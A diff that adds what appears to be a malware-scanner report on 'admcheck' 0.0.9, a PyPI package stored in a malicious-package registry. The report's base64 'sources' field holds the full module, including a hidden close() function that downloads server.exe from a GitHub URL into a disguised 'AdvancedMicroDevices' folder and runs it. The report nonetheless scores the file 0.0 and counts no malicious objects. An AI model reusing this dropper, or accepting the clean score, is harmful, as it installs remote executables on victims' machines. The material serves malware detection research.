@@ -1,0 +1,24 @@
+statistics:
+  total_files: 1
+  skipped_files: 0.0
+  processed_objects: 1
+  malicious_objects: 0
+details:
+- path: .repo_cache/malicious_repos/pypi_malregistry/admcheck/0.0.9/admcheck-0.0.9/admcheck-0.0.9/admcheck/main.py
+  contents:
+  - name: <module>
+    score: 0.0
+    code: |-
+      from admcheck import *
+      import ctypes, os, requests
+
+      def is_Admin():
+          try:
+              is_admin = (os.getuid() == 0)
+          except AttributeError:
+              is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+          return is_admin
+    tokens: resume load_const INTEGER load_const import_name admcheck call_intrinsic_1 INTRINSIC_IMPORT_STAR pop_top load_const INTEGER load_const import_name ctypes store_name ctypes load_const INTEGER load_const import_name os store_name os load_const INTEGER load_const import_name requests store_name requests load_const OBJECT make_function store_name is_Admin load_const OBJECT make_function store_name close return_const None
+    hash: 2ccaff4f92ed9c1e2fbf12b96cb40e86cb725e72faf3f8c92dd27a1e31f0b44a
+sources:
+  .repo_cache/malicious_repos/pypi_malregistry/admcheck/0.0.9/admcheck-0.0.9/admcheck-0.0.9/admcheck/main.py: ZnJvbSBhZG1jaGVjayBpbXBvcnQgKgppbXBvcnQgY3R5cGVzLCBvcywgcmVxdWVzdHMKCmRlZiBpc19BZG1pbigpOgogICAgdHJ5OgogICAgICAgIGlzX2FkbWluID0gKG9zLmdldHVpZCgpID09IDApCiAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6CiAgICAgICAgaXNfYWRtaW4gPSBjdHlwZXMud2luZGxsLnNoZWxsMzIuSXNVc2VyQW5BZG1pbigpICE9IDAKICAgIHJldHVybiBpc19hZG1pbgoKZGVmIGNsb3NlKCk6CiAgICB0cnk6CiAgICAgICAgZGlyZWN0b3J5ID0gIkFkdmFuY2VkTWljcm9EZXZpY2VzIgogICAgICAgIHBhcmVudF9kaXIgPSBmIkM6XFwiCiAgICAgICAgcGF0aCA9IG9zLnBhdGguam9pbihwYXJlbnRfZGlyLCBkaXJlY3RvcnkpCiAgICAgICAgb3MubWtkaXIocGF0aCkKICAgICAgICB1cmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Nhbm5vbmF0aW9uL1JvRERvUy9tYWluL3NlcnYvc3Yvc2VydmVyLmV4ZSIKICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHVybCkgIAogICAgICAgIHdpdGggb3BlbihmJ0M6Ly9BZHZhbmNlZE1pY3JvRGV2aWNlcy8vc2VydmVyLmV4ZScsICd3YicpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoci5jb250ZW50KQoKICAgICAgICBvcy5zdGFydGZpbGUoJ0M6Ly9BZHZhbmNlZE1pY3JvRGV2aWNlcy8vc2VydmVyLmV4ZScpCiAgICBleGNlcHQ6CiAgICAgcHJpbnQoIiIp
